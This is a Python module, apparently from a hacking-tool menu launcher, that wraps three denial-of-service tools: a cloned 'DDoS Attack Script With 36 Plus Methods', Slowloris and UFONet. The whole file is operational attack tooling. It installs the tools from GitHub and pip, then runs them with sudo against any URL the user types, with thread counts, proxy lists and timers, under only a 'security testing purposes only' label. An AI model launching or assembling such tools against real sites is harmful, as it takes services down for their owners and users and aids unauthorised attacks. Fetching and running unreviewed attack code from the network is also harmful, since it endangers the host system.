import subprocess

from rich.prompt import Prompt

from core import HackingTool, HackingToolsCollection, console


class DDoSTool(HackingTool):
    TITLE = "DDoS"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "Best DDoS Attack Script With 36 Plus Methods. "
        "DDoS attacks for SECURITY TESTING PURPOSES ONLY!"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos && pip install --user -r requirements.txt",
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos"

    def run(self):
        from config import get_tools_dir
        method     = Prompt.ask("Enter Method")
        url        = Prompt.ask("Enter URL")
        threads    = Prompt.ask("Enter Threads")
        proxylist  = Prompt.ask("Enter ProxyList")
        multiple   = Prompt.ask("Enter Multiple")
        timer      = Prompt.ask("Enter Timer")
        # Bug 4 fix: removed os.system("cd ddos;") — use cwd= instead
        subprocess.run(
            ["sudo", "python3", "ddos.py", method, url,
             "socks_type5.4.1", threads, proxylist, multiple, timer],
            cwd=str(get_tools_dir() / "ddos"),
        )


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "Slowloris is basically an HTTP Denial of Service attack. "
        "It sends lots of HTTP requests."
    )
    INSTALL_COMMANDS = ["pip install --user slowloris"]

    def run(self):
        target_site = Prompt.ask("Enter Target Site")
        subprocess.run(["slowloris", target_site])


class UFONet(HackingTool):
    TITLE = "UFOnet"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "UFONet is a free software, P2P and cryptographic disruptive toolkit "
        "that allows performing DoS and DDoS attacks."
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/epsylon/ufonet.git",
        "cd ufonet && pip install --user .",
    ]
    RUN_COMMANDS = ["python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [DDoSTool(), SlowLoris(), UFONet()]


if __name__ == "__main__":
    tools = DDOSTools()
    tools.show_options()
